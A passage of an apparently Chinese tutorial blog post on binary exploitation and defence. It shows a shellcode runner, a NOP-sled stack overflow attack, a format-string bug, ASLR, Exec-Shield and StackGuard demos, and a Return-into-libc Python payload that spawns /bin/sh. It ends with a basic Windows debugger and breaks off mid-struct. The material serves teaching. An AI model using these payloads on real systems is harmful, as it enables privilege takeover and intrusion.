</span>    <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span>                      <span class="c1">// int $0x80
</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
    <span class="n">p</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/img/interestingBin/1489145641910.png" alt="Alt text" /></p>

<p>shellcode完成，可在<code class="highlighter-rouge">exploit.py</code>使用</p>

<p>将这段代码插入到sample3的内存空间，然后将返回地址改为shellcode的起始地址，就可以夺取系统权限。</p>

<p><img src="/img/interestingBin/0310210948.png" alt="Alt text" /></p>

<p>函数的返回目标地址已经变成shellcode。</p>

<p>sample3.c在运行时候显示shellcode的地址，纯属演示效果。实际中，并不知道shellcode位于目标进程的哪个地址，只能推测。</p>

<p>不过栈的位置是可以推算出来的，因此可以尽量在内存中填充NOP(0x90)指令，然后将shellcode放在最后，这样可提高shellcode被执行概率。</p>

<p>此次使用的是strcpy函数，因此只要去除0x00就可以，但有些软件会对字符串有更多的限制，例如只接受英文字母。为了应付该情况，业界曾对用只用特定字符集编写shellcode进行了大量研究。</p>

<p><strong>近年由于操作系统默认启用了一些安全机制，传统的缓冲区溢出攻击已经不管用</strong></p>

<blockquote>
  <p><code class="highlighter-rouge">printf</code>类函数的字符串格式化bug也是具有代表性的漏洞。</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</code></pre></div></div>

<blockquote>
  <p>printf类函数中，有一个特殊的格式转换符%n,它可以向参数中指针所指的位置写入当前已输出的数据长度。利用%n，可以向任意地址写入任意值。和缓冲区溢出相比，该漏洞没那么严重。</p>
</blockquote>

<h3 id="防御攻击的技术">防御攻击的技术</h3>

<h4 id="地址随机化aslr">地址随机化:ASLR</h4>

<p>ASLR(Address Space Layout Randomization)是一种对栈、模块、动态分配的内存空间等的地址(位置)进行随机分配的机制。</p>

<p>ASLR属于操作系统功能，例如Ubuntu12.04中，可通过<code class="highlighter-rouge">/proc/sys/kernel/randomize_va_space</code>来查看和修改该设置。
切换到root用户，运行：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">guest</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
<span class="mi">2</span>
<span class="n">guest</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">echo</span> <span class="mi">0</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">guest</span><span class="o">:</span> 
<span class="mi">0</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
</code></pre></div></div>
<p>用cat命令查看<code class="highlighter-rouge">randomize_va_space</code>的值，输出的结果可能是0、1或者2.</p>
<ul>
  <li>0：禁用</li>
  <li>1：除堆以外随机化</li>
  <li>2：全部随机化（默认）</li>
</ul>

<p>通过以下程序确认ASLR的效果，该程序很简单，它会显示出用<code class="highlighter-rouge">malloc</code>分配的内存空间地址以及栈的地址。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp, %eax"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"malloc: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">" stack: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">get_sp</span><span class="p">());</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在启用ASLR的状态下，反复运行该程序，会发现程序地址不同。</p>

<p><img src="/img/interestingBin/1489156288416.png" alt="Alt text" /></p>

<p>如果地址布局无法推测出来，也就无法知道shellcode的具体地址。</p>

<p>同样的程序，若在禁用ASLR的状态下运行，则差异很大。</p>

<p><img src="/img/interestingBin/1489156557490.png" alt="Alt text" /></p>

<blockquote>
  <p>关闭ASLR之后，无论运行多少次，显示出的地址都完全相同。</p>
</blockquote>

<p>演示程序test01，该程序具备缓冲区溢出漏洞，它会用<code class="highlighter-rouge">strcpy</code>复制命令行参数中输入的字符串。</p>

<p><img src="/img/interestingBin/1489157112086.png" alt="Alt text" /></p>

<p>当启用ASLR时，test01所显示的地址每次都不同，因此无法将正确的地址传递给exploit.py，也就无法成功获取系统权限。</p>

<h4 id="exec-shield">Exec-Shield</h4>

<p>除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限：Exec-Shield</p>

<p>Exec-Shield是一种通过“限制内存空间的读写和执行权限”来防御攻击的机制。</p>

<p>通常情况下，不会在用作栈的内存空间里存放可执行的机器代码，因此可以将栈空间的权限设为可读写但不可执行。反过来，在代码区域中存放的机器语言代码，通常也不需要在运行时进行改写，因此可以将这部分内存的权限设置为不可写入。这样，即便将shellcode复制到栈中，若这些代码无法执行，就会产生Segmentation fault，导致程序停止运行。</p>

<p>要在系统中查看某个程序进程内存空间的读写和执行权限，在程序运行时输出<code class="highlighter-rouge">/proc/&lt;PID&gt;maps</code>就行</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">guest</span><span class="err">#</span> <span class="n">ps</span> <span class="o">-</span><span class="n">aef</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">test02</span>
<span class="n">root</span>      <span class="mi">8047</span>  <span class="mi">8033</span>  <span class="mi">0</span> <span class="mo">06</span><span class="o">:</span><span class="mi">59</span> <span class="n">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span> <span class="n">grep</span> <span class="o">--</span><span class="n">color</span><span class="o">=</span><span class="k">auto</span> <span class="n">test02</span>
<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">guest</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">8033</span><span class="o">/</span><span class="n">maps</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">stack</span>
<span class="n">bfaec000</span><span class="o">-</span><span class="n">bfb0d000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mo">00000000</span> <span class="mo">00</span><span class="o">:</span><span class="mo">00</span> <span class="mi">0</span>          <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
</code></pre></div></div>

<p>test02是test01加上Exec-Shield之后的版本，其中栈空间为<code class="highlighter-rouge">bfdcc00~bfded000</code>,它的权限是rw-p，没有代表执行权限的x.</p>

<p>测试Exec-Shield的效果：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">guest</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">test02</span> <span class="err">`</span><span class="n">python</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="s">"bffff710"</span><span class="err">`</span> <span class="n">aaaabbbbccccdddd</span>
<span class="mh">0xbfded260</span>
<span class="n">Segmentation</span> <span class="n">fault</span>
</code></pre></div></div>
<p>尽管输入的地址和输出的地址一样，但攻击还是失败了。</p>

<p><strong>ASLR的思路是防止攻击者猜中地址，而Exec-Shield则是在地址一致的情况下，攻击者也无法执行其中的机器语言代码</strong></p>

<blockquote>
  <p>查看test01的<code class="highlighter-rouge">/proc/&lt;PID&gt;/maps</code>，就会发现其栈空间也带有执行权限。这也是test01和test02的区别。</p>
</blockquote>

<h4 id="stackguard">StackGuard</h4>

<p><strong><code class="highlighter-rouge">StackGuard</code>是一种在编译时在各函数入口和出口插入用于检测栈数据完整性的机器语言代码的方法，它属于编译器的安全机制</strong></p>

<p>例子：</p>

<p><img src="/img/interestingBin/1489158826264.png" alt="StackGuard" /></p>

<p>在启用ASLR或Exec-Shield时，上述程序会产生Segmentation fault，但StackGuard则是让test03检测自身的异常，并主动停止运行。</p>

<p>test03具有栈缓冲区溢出的漏洞，当栈内数据发生溢出时，StackGuard代码能够检测这异常情况，并显示stack smashing detected消息，强制终止程序运行。</p>

<p>查看test03.s的代码，就能找到添加StackGuard的代码。</p>

<p><img src="/img/interestingBin/0310231832.png" alt="StackGuard代码" /></p>

<blockquote>
  <p>%gs:20在每次程序运行时，都会存入一个随机数，将该随机数复制到函数所使用的栈空间的最后。由于60(%esp)后面就是ebp和ret_addr，因此这样的配置可以保护关键地址的数据不被篡改。</p>
</blockquote>

<blockquote>
  <p>当函数即将返回之前，程序将%gs:20的值与60(%esp)进行比对。若由于某些原因导致溢出，ebp和ret_addr被覆盖，那么60(%esp)的值也会被同时覆盖。当检测到溢出时，程序将跳转到__stack_chk_fail，并终止运行。</p>
</blockquote>

<p>总之，StackGuard机制所保护的是ebp和ret_addr，是一种针对典型栈缓冲区溢出攻击的防御手段。</p>

<p><small>ubuntu12.04的gcc中，在编译时默认加上StackGuard代码，要禁用StackGuard需加上-fbo-stack-protector选项</small></p>

<h3 id="绕开安全机制">绕开安全机制</h3>

<h4 id="return-into-libc">Return-into-libc</h4>

<p>Return-into-libc是一种破解Exec-Shield的方法，思路是”即便无法执行任意代码(shellcode)，最终只要能运行任意程序也能获得系统权限”</p>

<p><strong>Return-into-libc的基本原理是通过调整参数和栈的配置，使得程序能够跳转到libc.so中的system函数以及exec类函数，借此运行<code class="highlighter-rouge">/bin/sh</code>等程序</strong></p>

<p>使用<code class="highlighter-rouge">ldd</code>命令查看程序在运行时所加载的库。</p>

<p><img src="/img/interestingBin/1489160105208.png" alt="ldd" /></p>

<p>几乎所有的程序在运行时都会加载<code class="highlighter-rouge">libc.so</code>，或者是在编译时进行静态链接。因此只要能够调用libc中的system函数和exec类函数，就能够夺取系统权限。</p>

<p>例子（关闭ASLR实验）</p>

<p><img src="/img/interestingBin/1489160347008.png" alt="Alt text" /></p>

<p>得到system和exit的地址。
这次就不需要将返回地址改成位于栈中的shellcode地址，而是改成system函数的入口地址，将system函数的返回目标设为exit，并将<code class="highlighter-rouge">/bin/sh</code>的地址作为参数传递过去。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
	<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x41414141</span>
<span class="k">else</span><span class="p">:</span>
	<span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x08</span>

<span class="n">fsystem</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">"b7e6c430"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">fexit</span>   <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">"b7e5ffb0"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">data</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
<span class="n">data</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span> <span class="n">fsystem</span><span class="p">)</span>
<span class="n">data</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span> <span class="n">fexit</span><span class="p">)</span>
<span class="n">data</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
<span class="n">data</span> <span class="o">+=</span> <span class="s">"/bin/sh"</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<p>演示结果：
<img src="/img/interestingBin/1489160621005.png" alt="Alt text" /></p>

<blockquote>
  <p>test02已开启Exec-Shield机制，但还是绕过了它并取得成功夺取的权限，这是一个简单的Return-into-libc的例子。但还是需要没有ASLR或者StackGuard防护机制才能攻击成功</p>
</blockquote>

<p>在此例中，使用了system函数代替了shellcode。</p>

<h4 id="rop">ROP</h4>

<p>Return-into-libc是利用库函数(libc)来代替shellcode发动攻击的方法。然而ASLR将加载的模块全部随机化，攻击也会因为无法获得准确的模块地址(不知道system和exec的地址)而失败。</p>

<p><strong>ROP(Return-Oriented-Programming)，面向返回编程。这种攻击来源于利用随机化的那些模块内部汇编代码拼接所需程序逻辑进行攻击的思路</strong></p>

<p>ROP 是一种高级的堆栈溢出攻击。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。在缓冲区溢出中，在将数据存入内存前未能正确检查适当范围的函数会收到多于正常承受范围的数据，如果数据将写入堆栈，多余的数据会溢出为函数变量分配的空间并覆盖替换 return 地址。在原本用以重定向控制流并返回给调用者的地址被覆盖替换后，控制流将改写到新分配的地址</p>

<p>ROP相关资料:</p>
<ul>
  <li><a href="https://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/">Return-into-libc 攻击及其防御</a></li>
  <li><a href="http://mudongliang.github.io/2016/08/04/intel-release-new-technology-specifications-to-protect-against-rop-attacks-zh.html">因特尔发布新的技术规范去防御 ROP 攻击</a></li>
  <li><a href="https://www.exploit-db.com/docs/35355.pdf">Deep Dive into ROP Payload Analysis</a></li>
</ul>

<h2 id="调试器和安全编程技巧">调试器和安全编程技巧</h2>

<p>调试器被称为“黑客之瞳”。调试器能跟踪一个进程的运行时状态。大多数调试器具有运行、暂停执行和单步执行、设置断点、修改寄存器和内存数据值以及捕获发生在目标进程的异常事件。</p>

<p><strong>调试器应当具备两种能力：</strong></p>
<ul>
  <li><strong>打开一个可执行文件并使之以自身进程的形式运行起来的能力</strong></li>
  <li><strong>附加一个现有进程的能力</strong></li>
</ul>

<p><img src="/img/interestingBin/1489198396343.png" alt="调试器类型" /></p>

<p><img src="/img/interestingBin/1489198921980.png" alt="调试器简易功能" /></p>

<p><img src="/img/interestingBin/调试器.png" alt="调试器功能" /></p>

<h3 id="调试器的工作原理">调试器的工作原理</h3>
<p>最简单的调试器代码wdbg01a.cpp：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "stdafx.h"
#include &lt;Windows.h&gt;
</span><span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">&gt;%s &lt;sample.exe&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>
<span class="c1">//通过GreateProcess()函数启动调试目标进程(也叫调试对象或者被调试程序debugge)
</span>    <span class="n">BOOL</span> <span class="n">r</span> <span class="o">=</span> <span class="n">CreateProcess</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> 
        <span class="n">NORMAL_PRIORITY_CLASS</span> <span class="o">|</span> <span class="n">CREATE_SUSPENDED</span> <span class="o">|</span> <span class="n">DEBUG_PROCESS</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">r</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DEBUG_EVENT</span> <span class="n">de</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">WaitForDebugEvent</span><span class="p">(</span><span class="o">&amp;</span><span class="n">de</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">))</span>
            <span class="k">break</span><span class="p">;</span>
        
        <span class="n">DWORD</span> <span class="n">dwContinueStatus</span> <span class="o">=</span> <span class="n">DBG_CONTINUE</span><span class="p">;</span>
        
        <span class="k">switch</span><span class="p">(</span><span class="n">de</span><span class="p">.</span><span class="n">dwDebugEventCode</span><span class="p">)</span>
        <span class="p">{</span>
        <span class="k">case</span> <span class="n">CREATE_PROCESS_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"CREATE_PROCESS_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">CREATE_THREAD_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"CREATE_THREAD_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">EXIT_THREAD_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"EXIT_THREAD_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">EXIT_PROCESS_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"EXIT_PROCESS_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">EXCEPTION_DEBUG_EVENT</span><span class="p">:</span>
            <span class="k">if</span><span class="p">(</span><span class="n">de</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">ExceptionRecord</span><span class="p">.</span><span class="n">ExceptionCode</span> <span class="o">!=</span> 
				<span class="n">EXCEPTION_BREAKPOINT</span><span class="p">)</span>
			<span class="p">{</span>
                <span class="n">dwContinueStatus</span> <span class="o">=</span> <span class="n">DBG_EXCEPTION_NOT_HANDLED</span><span class="p">;</span>
			<span class="p">}</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"EXCEPTION_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">OUTPUT_DEBUG_STRING_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"OUTPUT_DEBUG_STRING_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">RIP_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"RIP_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">LOAD_DLL_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"LOAD_DLL_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">UNLOAD_DLL_DEBUG_EVENT</span><span class="p">:</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"UNLOAD_DLL_DEBUG_EVENT</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">de</span><span class="p">.</span><span class="n">dwDebugEventCode</span> <span class="o">==</span> <span class="n">EXIT_PROCESS_DEBUG_EVENT</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="n">ContinueDebugEvent</span><span class="p">(</span>
            <span class="n">de</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">,</span> <span class="n">de</span><span class="p">.</span><span class="n">dwThreadId</span><span class="p">,</span> <span class="n">dwContinueStatus</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>调用CreateProcess函数时，若设置了<code class="highlighter-rouge">DEBUG_PROCESS</code>或 <code class="highlighter-rouge">DEBUG_ONLY_THIS_PROCESS</code>标志，则启动的进程(测试对象)中所产生的异常都会被调试器捕捉到。</p>

<ul>
  <li><strong><code class="highlighter-rouge">DEBUG_PROCESS</code>:</strong>调试对象所产生的子进程，以及子进程的子进程作为调试对象。</li>
  <li><strong><code class="highlighter-rouge">DEBUG_ONLY_THIS_PROCESS</code>:</strong>只将通过Create Process启动的那一个进程作为调试对象。</li>
</ul>

<blockquote>
  <p>CreateProcess函数的第1参数或者第2参数可用于传递目标程序的路径，然后便可以启动进程。</p>
</blockquote>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx">CreateProcess函数</a>(https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx)：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">CreateProcess</span><span class="p">(</span>
  <span class="n">_In_opt_</span>    <span class="n">LPCTSTR</span>               <span class="n">lpApplicationName</span><span class="p">,</span> <span class="c1">//可执行模块名称
</span>  <span class="n">_Inout_opt_</span> <span class="n">LPTSTR</span>                <span class="n">lpCommandLine</span><span class="p">,</span> <span class="c1">//命令行字符串
</span>  <span class="n">_In_opt_</span>    <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span> 
  <span class="n">_In_opt_</span>    <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="n">_In_</span>        <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span> <span class="c1">//句柄继承选项
</span>  <span class="n">_In_</span>        <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>  <span class="c1">//创建标志
</span>  <span class="n">_In_opt_</span>    <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span> <span class="c1">//新进程的环境变量块
</span>  <span class="n">_In_opt_</span>    <span class="n">LPCTSTR</span>               <span class="n">lpCurrentDirectory</span><span class="p">,</span> <span class="c1">//当前路径
</span>  <span class="n">_In_</span>        <span class="n">LPSTARTUPINFO</span>         <span class="n">lpStartupInfo</span><span class="p">,</span>  <span class="c1">//启动信息
</span>  <span class="n">_Out_</span>       <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>  <span class="c1">//进程信息
</span><span class="p">);</span>
</code></pre></div></div>

<p>通过<code class="highlighter-rouge">CREATE_SUSPENDED</code>标志可以让进程在启动后进入挂起状态。当设置这一标志时，<code class="highlighter-rouge">CreateProcess</code>函数调用完成之后，新进程中的所有线程都会暂停。尽管程序没有在运行，但程序 的可执行文件已经被加载到内存，这时可以对调试对象的数据进行改写。</p>

<p>在此程序中，没有任何操作而是直接调用了<code class="highlighter-rouge">ResumeThread</code>函数，这时调试对象的所有线程就会恢复运行。</p>

<p>ResumeThread函数：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="n">ResumeThread</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">hThread</span>  <span class="c1">//线程句柄
</span><span class="p">);</span>
</code></pre></div></div>

<p>当调试对象程序开始运行之后，调试器就开始等待捕捉异常。
调试事件会通过<code class="highlighter-rouge">WaitForDebugEvent</code>函数来进行接收。</p>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx">WaitForDebugEvent</a>函数（https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx）：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">WaitForDebugEvent</span><span class="p">(</span>
  <span class="c1">//保存调试事件信息的结构体指针
</span>  <span class="n">_Out_</span> <span class="n">LPDEBUG_EVENT</span> <span class="n">lpDebugEvent</span><span class="p">,</span>
  <span class="c1">//事件等待事件(毫秒)
</span>  <span class="n">_In_</span>  <span class="n">DWORD</span>         <span class="n">dwMilliseconds</span>
<span class="p">);</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">WaitForDebugEvent</code>函数的第1参数传递了一个DEBUG_EVENT结构体，捕捉到的调试事件会被存放在这个结构体中，第二参数dwMilliseconds如果设置了INFINITE则表示一直等待。</p>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308(v=vs.85).aspx">DEBUG_EVENT</a>结构体（https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308(v=vs.85).aspx）的定义如下：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_DEBUG_EVENT</span> <span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">dwDebugEventCode</span><span class="p">;</span>
